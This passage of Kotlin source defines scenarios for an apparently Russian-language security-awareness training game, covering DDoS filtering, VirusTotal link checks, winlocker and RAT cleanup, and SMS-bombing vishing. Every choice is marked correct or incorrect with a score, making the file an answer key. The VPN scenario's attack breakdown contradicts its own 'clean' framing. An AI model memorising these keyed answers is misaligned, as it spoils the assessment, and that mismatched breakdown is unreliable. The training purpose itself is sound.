                            explanationWhenChosen = "Высокий rate у CDN/API Яндекса может быть нормальным фоном. Блокировка без анализа ломает сервисы пользователей.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Карты и геосервисы перестали открываться в офисе. Инцидент эскалирован: откат правил.",
                        ),
                        InternalChoice(
                            id = "pdn-1-b",
                            label = "Разорвать поток к flood-syn.xyz",
                            correct = true,
                            explanationWhenChosen = "Верно: домен не относится к вашим сервисам и доверенному списку, rate зашкаливает — типичный признак ботнет-нагрузки на периметр.",
                            scoreDelta = 6,
                        ),
                        InternalChoice(
                            id = "pdn-1-c",
                            label = "Разорвать поток к cdnjs.cloudflare.com",
                            correct = false,
                            explanationWhenChosen = "Cloudflare CDN — часть нормальной веб-инфраструктуры. Резать такой поток без подтверждения рискованно.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Перестали грузиться скрипты с CDN — часть внутренних порталов «сломалась».",
                        ),
                        InternalChoice(
                            id = "pdn-1-d",
                            label = "Разорвать поток к outlook.office365.com",
                            correct = false,
                            explanationWhenChosen = "Microsoft 365 — из доверенного контура. Это не цель учебной атаки; блокировка ударит по почте.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Outlook отвалился у части пользователей. Срочный откат.",
                        ),
                        InternalChoice(
                            id = "pdn-1-e",
                            label = "Разорвать поток к gosuslugi.ru",
                            correct = false,
                            explanationWhenChosen = "Госуслуги в белом списке доверенных доменов для этого шага. Блокировать без веской причины нельзя.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Нарушен доступ к госсервисам — репутационный и организационный ущерб.",
                        ),
                    ),
                    uiKind = StepUiKind.NET_SHIELD_CONSOLE,
                    emailSubject = "perimeter-gw-03",
                    netShieldGame = InternalNetShieldGame(
                        consoleTitle = "NetShield — активные входящие (TCP/443)",
                        rows = listOf(
                            InternalNetShieldRow(
                                id = "pdn-r1",
                                remoteIp = "87.250.250.3",
                                remoteHost = "api-maps.yandex.ru",
                                rateLabel = "11 200 сессий/с",
                                note = "геосервисы",
                                choiceId = "pdn-1-a",
                            ),
                            InternalNetShieldRow(
                                id = "pdn-r2",
                                remoteIp = "45.153.91.200",
                                remoteHost = "flood-syn.xyz",
                                rateLabel = "41 800 сессий/с",
                                note = "SYN flood · неизвестный хост",
                                choiceId = "pdn-1-b",
                            ),
                            InternalNetShieldRow(
                                id = "pdn-r3",
                                remoteIp = "104.21.80.11",
                                remoteHost = "cdnjs.cloudflare.com",
                                rateLabel = "920 сессий/с",
                                note = "CDN",
                                choiceId = "pdn-1-c",
                            ),
                            InternalNetShieldRow(
                                id = "pdn-r4",
                                remoteIp = "52.98.123.45",
                                remoteHost = "outlook.office365.com",
                                rateLabel = "380 сессий/с",
                                note = "Microsoft 365",
                                choiceId = "pdn-1-d",
                            ),
                            InternalNetShieldRow(
                                id = "pdn-r5",
                                remoteIp = "95.173.136.88",
                                remoteHost = "gosuslugi.ru",
                                rateLabel = "112 сессий/с",
                                note = "госсервис",
                                choiceId = "pdn-1-e",
                            ),
                        ),
                    ),
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "pdn-1-asn",
                            title = "Что смотреть в таблице",
                            body = "Сверяйте имя узла с белым списком. Аномалия — не высокий rate сам по себе, а сочетание: незнакомый домен + на порядки больше, чем у соседей + нет бизнес-причины.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    pressureSeconds = 85,
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "DDoS-атака: цель — исчерпать ресурсы периметра. Задача защиты — разорвать только вредоносные потоки, сохранив легитимный трафик.",
                techniques = listOf(
                    AttackTechnique("T1498.001", "Network Denial of Service: Direct Network Flood", "Impact",
                        "Массированный поток UDP/HTTP-запросов с ботнет-узлов перегружает периметр."),
                    AttackTechnique("T1499", "Endpoint Denial of Service", "Impact",
                        "Перегрузка периметра блокирует доступ легитимных пользователей к сервисам."),
                ),
                howToDefend = "Применяй rate limiting и CDN с DDoS-защитой (Cloudflare, AWS Shield). Фильтруй по репутации IP. Не блокируй трафик огульно — это навредит легитимным пользователям.",
            ),
        )

        /** Коллега прислал ссылку на VPN; сначала VirusTotal, затем осознанный переход (учебный «чистый» кейс). */
        fun vpnColleagueVirustotalClean(): InternalScenario = InternalScenario(
            id = "vpn-colleague-virustotal-clean",
            title = "Ссылка на VPN от коллеги",
            type = ScenarioType.SOCIAL,
            description = "В чате делятся «выгодной» ссылкой на подписку VPN. Сначала проверяете репутацию в VirusTotal — учебный отчёт без детектов, затем решаете, переходить ли.",
            attackTypeLabel = "Репутация ссылки / легитимная покупка после проверки",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "vcv-1",
                    situationBrief = """
                        Рабочий мессенджер. Коллега из соседнего отдела прислал сообщение: нашли дешёвый корпоративный VPN
                        по партнёрской ссылке «для команды». Ссылка незнакомая, но отправитель — реальный человек.
                    """.trimIndent(),
                    narrative = """
                        Привет, взял подписку тут для удалёнки — работает стабильно, скидка по коду OFFICE.

                        https://partner-office-vpn.guardsim.example/order?ref=team

                        Если что, это не реклама в смысле спама — просто делюсь.
                    """.trimIndent(),
                    narrativeNoise = "Канал #infra-random · вчера 14:02",
                    choices = listOf(
                        InternalChoice(
                            id = "vcv-1-a",
                            label = "Сразу перейду по ссылке — пишет свой человек",
                            correct = false,
                            explanationWhenChosen = "Даже от коллеги ссылку стоит сначала проверить на репутацию (VirusTotal URL scan, записи WHOIS) и сверить с политикой закупок ПО. Аккаунт коллеги тоже могут взломать.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Ссылка могла вести на поддельную кассу или троянизированный инсталлятор. В реальности — изолировать машину и менять пароли, если уже кликнули.",
                        ),
                        InternalChoice(
                            id = "vcv-1-b",
                            label = "Сначала проверю URL в VirusTotal / репутации, не переходя по ссылке из чата",
                            correct = true,
                            explanationWhenChosen = "Правильно: отдельная проверка URL до клика снижает риск. Затем можно сравнить с белым списком поставщиков и политикой ИБ.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "vcv-1-c",
                            label = "Перешлю ссылку всему отделу — пусть каждый решит сам",
                            correct = false,
                            explanationWhenChosen = "Массовая пересылка непроверенной ссылки увеличивает поверхность атаки. Сначала проверка, потом — при необходимости — одобренное сообщение без активной ссылки или через IT.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "Команда · Инфраструктура",
                    simChatSenderLabel = "Коллега · отдел эксплуатации",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "vcv-1-pol",
                            title = "Политика закупок",
                            body = "Любое VPN и шифрование трафика на рабочих ПК согласуются с ИБ и закупкой. «Личные» ссылки обходят учёт лицензий.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "vcv-1-link",
                            label = "Открыть ссылку partner-office-vpn.guardsim.example",
                            choiceId = "vcv-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "vcv-1-vt",
                            label = "Сначала проверить URL в VirusTotal",
                            choiceId = "vcv-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "vcv-1-fwd",
                            label = "Переслать ссылку отделу",
                            choiceId = "vcv-1-c",
                            variant = "SHARE",
                        ),
                    ),
                    pressureSeconds = 55,
                ),
                InternalStep(
                    id = "vcv-2",
                    situationBrief = """
                        Вы вставили адрес в учебный интерфейс VirusTotal (в жизни — virustotal.com, раздел URL).
                        Ниже — условный отчёт: движки не находят вредоноса по этому URL на момент проверки.
                    """.trimIndent(),
                    narrative = """
                        Отчёт готов. Сверьте число срабатываний и по возможности откройте сайт только если политика компании
                        разрешает такую покупку и вы уверены в домене.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "vcv-2-a",
                            label = "Раз детектов нет — открою ссылку в новой вкладке и оформлю только на HTTPS, без скачивания «ускорителей»",
                            correct = true,
                            explanationWhenChosen = "После чистого отчёта разумно перейти осознанно: новая вкладка, проверка сертификата и URL, никаких сторонних exe. Итоговая покупка всё равно должна соответствовать регламенту закупок.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "vcv-2-b",
                            label = "VirusTotal ничего не нашёл — значит, можно скачать любой предложенный установщик и запустить от администратора",
                            correct = false,
                            explanationWhenChosen = "URL без детектов не гарантирует честный инсталлятор и отсутствие обхода на следующем шаге. Не запускайте бинарники в обход ИБ и политики.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Установщик оказался подкинутым со страницы — получена точка закрепления. Нужен инцидент и переустановка образа.",
                        ),
                        InternalChoice(
                            id = "vcv-2-c",
                            label = "Не открою никогда — если ссылка не из IT, она всегда вредоносная",
                            correct = false,
                            explanationWhenChosen = "Паранойя лучше кликов вслепую, но после проверки и согласования с политикой легитимная покупка возможна. Важно процедуры, а не абсолютный запрет.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.VIRUSTOTAL_LOOKUP,
                    virusTotalGame = InternalVirusTotalGame(
                        scannedUrl = "https://partner-office-vpn.guardsim.example/order?ref=team",
                        enginesFlagged = 0,
                        enginesTotal = 72,
                        permalinkStub = "guardsim-edu · analysis/u/guardsim-vpn-url",
                        verdictHeadline = "По данным учебного снимка: вредоносных срабатываний по URL не обнаружено.",
                    ),
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "vcv-2-lim",
                            title = "Ограничения сканера",
                            body = "Скан URL в VirusTotal не заменяет анализ файла, поведения сайта и политики компании. Фишинг и drive-by могут проявиться позже.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "vcv-2-open",
                            label = "Открыть ссылку осторожно (HTTPS, без лишних загрузок)",
                            choiceId = "vcv-2-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "vcv-2-run",
                            label = "Скачать и запустить любой установщик со страницы",
                            choiceId = "vcv-2-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "vcv-2-never",
                            label = "Никогда не открывать",
                            choiceId = "vcv-2-c",
                            variant = "ACTION",
                        ),
                    ),
                    pressureSeconds = 50,
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Zero-hour атака: вредоносное ПО настолько свежее, что ни один антивирус его ещё не знает. «Чистый» VirusTotal ≠ безопасный файл.",
                techniques = listOf(
                    AttackTechnique("T1566.002", "Spearphishing via Service", "Initial Access",
                        "Ссылка распространяется через корпоративный мессенджер от имени коллеги (или угнанного аккаунта)."),
                    AttackTechnique("T1036", "Masquerading", "Defense Evasion",
                        "Файл ещё не попал в антивирусные базы — VirusTotal показывает 0 детектов. Классический случай нулевого часа."),
                ),
                howToDefend = "VirusTotal — один из инструментов, не финальный вердикт. Проверяй: знаком ли источник, ожидал ли ты этот файл. Свежие угрозы всегда проходят мимо сигнатурного анализа.",
            ),
        )

        /** Винлокер: безопасный режим, удаление файла и записи автозагрузки — короткая цепочка. */
        fun winlockerSafeModeCleanup(): InternalScenario = InternalScenario(
            id = "winlocker-safe-mode-cleanup",
            title = "Винлокер: безопасный режим и чистка",
            type = ScenarioType.EMAIL,
            description = "Три коротких шага: экран блокировки с требованием оплаты, работа в безопасном режиме, удаление исполняемого файла и ключа автозапуска в реестре.",
            attackTypeLabel = "Винлокер / блокировка рабочего стола",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "wlc-1",
                    situationBrief = "На экране монитора полноэкранное окно с требованием перевода и таймером. Система якобы «зашифрована».",
                    narrative = """
                        Сообщение перекрывает рабочий стол, горячие клавиши диспетчера задач не срабатывают.
                        Что сделать в первую очередь на заражённой учебной станции?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "wlc-1-a",
                            label = "Оплатить по указанным реквизитам, чтобы быстро вернуть работу",
                            correct = false,
                            explanationWhenChosen = "Оплата мошенникам не гарантирует разблокировку и финансирует преступников. Стандартный ответ — не платить, изолировать ПК и следовать процедуре восстановления.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Средства ушли, блокировка осталась. ПК всё равно нужно чистить по регламенту ИБ.",
                        ),
                        InternalChoice(
                            id = "wlc-1-b",
                            label = "Принудительно перезагрузить ПК и войти в безопасный режим (минимальная конфигурация) для ручной чистки",
                            correct = true,
                            explanationWhenChosen = "Верно: безопасный режим отключает лишний автозапуск и облегчает удаление вредоносного процесса/файла. Далее — по инструкции ИБ или проверенному чек-листу.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "wlc-1-c",
                            label = "Несколько раз нажать Alt+F4 и надеяться, что окно закроется",
                            correct = false,
                            explanationWhenChosen = "Современные винлокеры перехватывают ввод; «закрыть окно» редко помогает. Нужен перезапуск в безопасном режиме или загрузочный носитель.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Инцидент: полноэкранная блокировка рабочей станции",
                    emailFrom = "Портал ИБ · очередь: эндпоинты",
                    hotspots = listOf(
                        InternalHotspot(id = "wlc-1-pay", label = "Оплатить выкуп", choiceId = "wlc-1-a", variant = "ACTION"),
                        InternalHotspot(id = "wlc-1-safe", label = "Перезагрузка в безопасный режим", choiceId = "wlc-1-b", variant = "ACTION"),
                        InternalHotspot(id = "wlc-1-altf4", label = "Закрыть окно Alt+F4", choiceId = "wlc-1-c", variant = "ACTION"),
                    ),
                    pressureSeconds = 45,
                ),
                InternalStep(
                    id = "wlc-2",
                    situationBrief = "Вы в безопасном режиме. В автозагрузке обнаружен подозрительный исполняемый файл.",
                    narrative = """
                        Путь: C:\Users\Public\Music\WinSecGuard.exe
                        Размер небольшой, цифровой подписи нет, дата изменения — сегодня ночью.

                        Какой шаг следующий?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "wlc-2-a",
                            label = "Удалить WinSecGuard.exe и очистить корзину; затем полное сканирование антивирусом",
                            correct = true,
                            explanationWhenChosen = "Удаление известного бинарника винлокера — ключевой шаг. Корзину очищают, чтобы файл не восстановился случайно; затем — проверка всей системы.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "wlc-2-b",
                            label = "Переименовать файл в .bak и оставить на диске «на всякий случай»",
                            correct = false,
                            explanationWhenChosen = "Переименование не устраняет угрозу: файл остаётся исполняемым или может быть снова запущен. Удаление и сканирование надёжнее.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "wlc-2-c",
                            label = "Сразу выйти из безопасного режима в обычную Windows без удаления файла",
                            correct = false,
                            explanationWhenChosen = "В обычной загрузке винлокер снова активируется. Сначала удаление и автозапуск, потом нормальный режим.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Блокировка вернулась сразу после входа. Повторная чистка с нуля.",
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Безопасный режим: найден WinSecGuard.exe",
                    emailFrom = "Портал ИБ · эндпоинты",
                    hotspots = listOf(
                        InternalHotspot(id = "wlc-2-del", label = "Удалить файл и просканировать систему", choiceId = "wlc-2-a", variant = "ACTION"),
                        InternalHotspot(id = "wlc-2-bak", label = "Переименовать в .bak", choiceId = "wlc-2-b", variant = "ACTION"),
                        InternalHotspot(id = "wlc-2-boot", label = "Выйти в обычный режим без удаления", choiceId = "wlc-2-c", variant = "ACTION"),
                    ),
                    pressureSeconds = 40,
                ),
                InternalStep(
                    id = "wlc-3",
                    situationBrief = "В редакторе реестра (учебно) видна автозагрузка текущего пользователя.",
                    narrative = """
                        Раздел: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
                        Параметр: WinSecMgr → значение указывает на удалённый уже WinSecGuard.exe

                        Что сделать с параметром WinSecMgr?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "wlc-3-a",
                            label = "Удалить значение WinSecMgr из Run, перезагрузиться в обычном режиме и снова запустить полное сканирование",
                            correct = true,
                            explanationWhenChosen = "Удаление ключа автозапуска предотвращает повторный старт оболочки винлокера. Контрольная перезагрузка и сканирование закрепляют результат.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "wlc-3-b",
                            label = "Оставить ключ — файл всё равно уже удалён",
                            correct = false,
                            explanationWhenChosen = "Битая запись может мешать загрузке или быть восстановлена другим модулем. Лучше убрать явный автозапуск.",
                            scoreDelta = 0,
                        ),
                        InternalChoice(
                            id = "wlc-3-c",
                            label = "Удалить весь раздел Run целиком",
                            correct = false,
                            explanationWhenChosen = "Удаление всего раздела Run ломает легитимные программы (драйверы гарнитур, утилиты). Точечно удаляйте только вредоносные значения.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Отвалился ряд штатных автозапусков. Восстановление из бэкапа реестра.",
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Реестр: Run · WinSecMgr",
                    emailFrom = "Портал ИБ · эндпоинты",
                    hotspots = listOf(
                        InternalHotspot(id = "wlc-3-delv", label = "Удалить только WinSecMgr", choiceId = "wlc-3-a", variant = "ACTION"),
                        InternalHotspot(id = "wlc-3-keep", label = "Оставить ключ как есть", choiceId = "wlc-3-b", variant = "ACTION"),
                        InternalHotspot(id = "wlc-3-wipe", label = "Удалить весь раздел Run", choiceId = "wlc-3-c", variant = "ACTION"),
                    ),
                    pressureSeconds = 40,
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Ransomware-подобный winlocker: блокирует ОС, закрепляется через реестр. Безопасный режим отключает автозапуск и позволяет удалить вредонос вручную.",
                techniques = listOf(
                    AttackTechnique("T1486", "Data Encrypted for Impact", "Impact",
                        "Winlocker блокирует рабочий стол и требует выкуп, угрожая удалением файлов."),
                    AttackTechnique("T1547.001", "Boot/Logon Autostart: Registry Run Keys", "Persistence",
                        "Вредонос прописан в HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run для автозапуска при каждом входе."),
                ),
                howToDefend = "Безопасный режим (F8) отключает сторонние записи автозагрузки. Удали исполняемый файл и ключ Run в реестре. Регулярные бэкапы позволяют восстановить данные без выкупа.",
            ),
        )

        /** RAT: изоляция хоста, снятие закрепления, контроль учётных данных. */
        fun ratIncidentResponse(): InternalScenario = InternalScenario(
            id = "rat-incident-response",
            title = "RAT на рабочей станции",
            type = ScenarioType.EMAIL,
            description = "Подозрение на удалённый троян (RAT): странная активность мыши, исходящие сессии. Короткая цепочка реагирования.",
            attackTypeLabel = "Remote Access Trojan (RAT)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "rat-1",
                    situationBrief = """
                        Пользователь сообщает: курсор иногда двигается сам, в трее мелькает незнакомый значок,
                        антивирус молчит. Вы дежурный ИБ.
                    """.trimIndent(),
                    narrative = """
                        Первый приоритет при подозрении на активный RAT на корпоративном ПК?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "rat-1-a",
                            label = "Немедленно изолировать хост от сети (кабель/Wi‑Fi/VLAN), зафиксировать время и сохранить артефакты для расследования",
                            correct = true,
                            explanationWhenChosen = "Изоляция рвёт канал управления атакующего и снижает утечку данных. Далее — образ диска или снятие дампа по регламенту.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "rat-1-b",
                            label = "Попросить пользователя «пока поработать как обычно», чтобы поймать злоумышленника",
                            correct = false,
                            explanationWhenChosen = "Оставлять скомпрометированный хост в сети опасно: идёт эксфильтрация и lateral movement. Сначала изоляция, потом охота.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "За время «наблюдения» украдены файлы проекта и хэши сессий.",
                        ),
                        InternalChoice(
                            id = "rat-1-c",
                            label = "Установить ещё один бесплатный «усилитель антивируса» с первого попавшегося сайта",
                            correct = false,
                            explanationWhenChosen = "Панические установки с непроверенных сайтов усугубляют компрометацию. Действия по процедуре ИБ и доверенным инструментам.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Алерт: подозрение на удалённый доступ к ПК",
                    emailFrom = "SOC · очередь: эндпоинты",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "rat-1-ioc",
                            title = "Признаки RAT",
                            body = "Скрытые RDP/TeamViewer-подобные сессии, неизвестные исходящие на нестандартные порты, микрофон/камера без действий пользователя — повод для изоляции.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(id = "rat-1-iso", label = "Изолировать ПК от сети", choiceId = "rat-1-a", variant = "ACTION"),
                        InternalHotspot(id = "rat-1-wait", label = "Пусть работает как обычно", choiceId = "rat-1-b", variant = "ACTION"),
                        InternalHotspot(id = "rat-1-crapav", label = "Поставить случайный антивирус с сайта", choiceId = "rat-1-c", variant = "ACTION"),
                    ),
                    pressureSeconds = 50,
                ),
                InternalStep(
                    id = "rat-2",
                    situationBrief = "Хост изолирован. В автозагрузке и планировщике найдена задача, запускающая бинарник из Temp.",
                    narrative = """
                        Задача планировщика: «OfficeHealthCheck» → C:\Users\user\AppData\Local\Temp\svch0st.exe
                        Процесс маскируется под системный.

                        Что выполнить до возврата в прод-сеть?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "rat-2-a",
                            label = "Отключить задачу, удалить svch0st.exe, проверить связанные ключи Run/Services и полное сканирование EDR",
                            correct = true,
                            explanationWhenChosen = "Снятие закрепления (scheduled task + файл) и контроль смежных точек автозапуска — стандартный шаг против RAT. EDR даёт телеметрию по цепочке.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "rat-2-b",
                            label = "Только завершить процесс в диспетчере задач и снова включить сеть",
                            correct = false,
                            explanationWhenChosen = "Процесс перезапустится из планировщика или другого persistence. Нужно убрать задачу и файлы, затем проверка.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "RAT восстановился через минуту после включения сети.",
                        ),
                        InternalChoice(
                            id = "rat-2-c",
                            label = "Переустановить только браузер",
                            correct = false,
                            explanationWhenChosen = "Переустановка браузера не устраняет системный RAT и закрепление вне браузера.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Изолированный ПК: OfficeHealthCheck → svch0st.exe",
                    emailFrom = "SOC · эндпоинты",
                    hotspots = listOf(
                        InternalHotspot(id = "rat-2-full", label = "Снять задачу, удалить файл, скан EDR", choiceId = "rat-2-a", variant = "ACTION"),
                        InternalHotspot(id = "rat-2-kill", label = "Только снять процесс и включить сеть", choiceId = "rat-2-b", variant = "ACTION"),
                        InternalHotspot(id = "rat-2-browser", label = "Переустановить браузер", choiceId = "rat-2-c", variant = "ACTION"),
                    ),
                    pressureSeconds = 45,
                ),
                InternalStep(
                    id = "rat-3",
                    situationBrief = "Вредоносный модуль удалён, образ снят. Остаётся финальная фаза.",
                    narrative = """
                        Учётная запись пользователя использовалась на скомпрометированной машине; возможен перехват токенов/паролей.

                        Какое завершение инцидента наиболее полное?
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "rat-3-a",
                            label = "Сбросить пароли и сессии для затронутых учёток, проверить MFA, при необходимости пересобрать ПК из доверенного образа; отчёт в ИБ",
                            correct = true,
                            explanationWhenChosen = "RAT часто ворует учётные данные. Сброс паролей/сессий и контроль MFA снижают повторный вход. Чистый образ — когда есть сомнения в целостности ОС.",
                            scoreDelta = 6,
                        ),
                        InternalChoice(
                            id = "rat-3-b",
                            label = "Поблагодарить пользователя и вернуть тот же ПК в сеть без смены паролей",
                            correct = false,
                            explanationWhenChosen = "Без ротации секретов атакующий может вернуться теми же ключами. Минимум — принудительная смена пароля и отзыв сессий.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Через украденный токен снова открыт доступ к почте и VPN.",
                        ),
                        InternalChoice(
                            id = "rat-3-c",
                            label = "Только отключить Wi‑Fi на ноутбуке пользователя навсегда",
                            correct = false,
                            explanationWhenChosen = "Это не устраняет компрометацию учёток и не восстанавливает безопасную работу. Нужны процедуры восстановления и контроль доступа.",
                            scoreDelta = 0,
                        ),
                    ),
                    uiKind = StepUiKind.DESK_TICKET,
                    emailSubject = "Закрытие инцидента RAT",
                    emailFrom = "SOC · эндпоинты",
                    hotspots = listOf(
                        InternalHotspot(id = "rat-3-full", label = "Ротация паролей/сессий, MFA, отчёт", choiceId = "rat-3-a", variant = "ACTION"),
                        InternalHotspot(id = "rat-3-none", label = "Вернуть в сеть как есть", choiceId = "rat-3-b", variant = "ACTION"),
                        InternalHotspot(id = "rat-3-wifi", label = "Навсегда отключить Wi‑Fi", choiceId = "rat-3-c", variant = "ACTION"),
                    ),
                    pressureSeconds = 40,
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "RAT (Remote Access Trojan): атакующий управляет заражённой машиной в реальном времени — перехватывает ввод, видит экран, скачивает файлы. Немедленная изоляция критична.",
                techniques = listOf(
                    AttackTechnique("T1219", "Remote Access Software", "Command and Control",
                        "RAT обеспечивает постоянный скрытый доступ через зашифрованный C2-канал."),
                    AttackTechnique("T1547", "Boot/Logon Autostart", "Persistence",
                        "Троян закрепляется в автозапуске для выживания после перезагрузки."),
                    AttackTechnique("T1041", "Exfiltration Over C2 Channel", "Exfiltration",
                        "Скриншоты, кейлоггинг и файлы браузера уходят через тот же C2-канал."),
                ),
                howToDefend = "При подозрении на RAT — сразу сетевая изоляция хоста, никакого ввода паролей до очистки. Далее: форензика процессов и автозапуска, смена всех паролей, которые мог перехватить кейлоггер.",
            ),
        )

        /** SMS-бомбинг как шум: на фоне — «важный» звонок «антифрода» (vishing под прикрытием). */
        fun smsBomberPhishingSmokescreen(): InternalScenario = InternalScenario(
            id = "sms-bomber-phishing-smokescreen",
            title = "Бомбинг SMS и звонок «поддержки»",
            type = ScenarioType.SOCIAL,
            description = "Лента сообщений забита сервисными SMS; поверх — входящий звонок якобы от банка. Учимся не действовать под шумом и верифицировать только через официальный канал.",
            attackTypeLabel = "SMS-бомбинг + vishing под шумом",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "sbp-1",
                    situationBrief = """
                        Вечер. На телефон сыплются SMS от доставок, маркетплейсов и «кодов» — классический фон при бомбинге.
                        В этот момент приходит входящий звонок: голосовая подсказка показывает «Антифрод банка» и красивый номер.
                        Ниже — учебная имитация экрана телефона: пролистайте ленту и оцените звонок.
                    """.trimIndent(),
                    narrative = """
                        Шум в ленте намеренно отвлекает. Настоящий банк не требует диктовать одноразовые коды по телефону и не просит
                        установить удалённый доступ под давлением. Спокойный канал — приложение банка или номер с карты/сайта, набранный вами.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "sbp-1-a",
                            label = "Сбросить звонок и зайти в банк только через официальное приложение или набрать номер поддержки с карты / с сайта банка",
                            correct = true,
                            explanationWhenChosen = "Верно: изолировать спокойную верификацию. Входящий звонок на фоне хаоса — типичный приём; канал вы выбираете сами, а не тот, кто звонит первым.",
                            scoreDelta = 6,
                        ),
                        InternalChoice(
                            id = "sbp-1-b",
                            label = "Ответить и продиктовать код из SMS «для отмены блокировки», как просит голос",
                            correct = false,
                            explanationWhenChosen = "Коды из SMS — секрет. Их никому не диктуют по телефону, даже если звонящий знает ваше имя. Это почти всегда мошенничество или сцена с подменой номера.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Код использовали для подтверждения перевода или смены номера телефона в банке. Срочно блокируйте карту через приложение и звоните только на официальный номер.",
                        ),
                        InternalChoice(
                            id = "sbp-1-c",
                            label = "Ответить и установить AnyDesk / TeamViewer «как сказал специалист»",
                            correct = false,
                            explanationWhenChosen = "Удалённый доступ под предлогом «антифрода» — путь к полному контролю над устройством. Банки так не работают.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Злоумышленник получил доступ к экрану и сессиям. Нужна изоляция устройства и инцидент в ИБ.",
                        ),
                    ),
                    uiKind = StepUiKind.MOBILE_PHONE_INCIDENT,
                    phoneIncidentGame = InternalPhoneIncidentGame(
                        statusBarTime = "21:14",
                        networkLabel = "LTE · 4G",
                        screenTitle = "Сообщения",
                        smsLines = listOf(
                            InternalPhoneSmsLine("Ozon", "Код 482901. Никому не говорите.", "21:12"),
                            InternalPhoneSmsLine("CDEK", "Заказ #8832 в пункте выдачи до 20:00", "21:12"),
                            InternalPhoneSmsLine("Yandex", "Ваш код: 102938", "21:11"),
                            InternalPhoneSmsLine("Wildberries", "Скидка 15% до полуночи", "21:11"),
                            InternalPhoneSmsLine("Gosuslugi", "Код подтверждения 556677", "21:10"),
                            InternalPhoneSmsLine("DPD_RU", "Курьер сегодня 18–22", "21:10"),
                            InternalPhoneSmsLine("VK", "Код входа 884422", "21:09"),
                            InternalPhoneSmsLine("SMS_Info", "Ваш пакет задержан. Ссылка: t.ly/fake-pack", "21:09"),
                            InternalPhoneSmsLine("BankAlert", "НЕ ДЕЙСТВУЙТЕ: ждите звонок антифрода", "21:08"),
                            InternalPhoneSmsLine("Lamoda", "Верните товар в течение 14 дней", "21:08"),
                            InternalPhoneSmsLine("Uber", "Поездка завершена. Чек в приложении", "21:07"),
                            InternalPhoneSmsLine("Steam", "Код Steam Guard: R5K9L", "21:06"),
                            InternalPhoneSmsLine("2GIS", "Код для входа 337744", "21:05"),
                        ),
                        callOverlay = InternalPhoneCallOverlay(
                            callerLabel = "Антифрод",
                            callerSubtitle = "мобильный банк · срочно",
